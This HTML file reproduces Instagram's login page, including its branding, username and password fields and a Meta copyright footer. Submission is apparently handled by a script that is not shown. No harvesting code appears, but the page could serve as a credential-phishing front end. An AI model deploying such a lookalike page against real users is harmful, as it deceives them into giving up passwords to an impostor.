<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css" />
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
</head>
<body>
  <div class="container">
    <form id="loginForm">
      <h1 class="logo">Instagram</h1>

      <input type="text" name="username" placeholder="Phone number, username or email address" required />
      <div class="password-field">
        <input type="password" name="password" placeholder="Password" required />
        <span id="togglePassword">Show</span>
      </div>

      <button type="submit">Log in</button>

      <div class="divider"><span>OR</span></div>

      <a href="#" class="facebook-login">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" />
        Log in with Facebook
      </a>

      <a href="#" class="forgot">Forgot password?</a>
    </form>

    <div class="signup-box">
      Don't have an account? <a href="#">Sign up</a>
    </div>

    <div class="get-app">
      <p>Get the app.</p>
      <div class="store-buttons">
        <img src="googleplay.svg" alt="Google Play" />
        <img src="microsoft_store_badge.avif" alt="Microsoft Store" />
      </div>
    </div>

    <footer>
      <div class="footer-links">
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
        <a href="#">Contact Uploading & Non-Users</a>
        <a href="#">Meta Verified</a>
      </div>
      <p class="footer-note">English Â© 2025 Instagram from Meta</p>
    </footer>
  </div>

  <script src="script.js"></script>
</body>
</html>
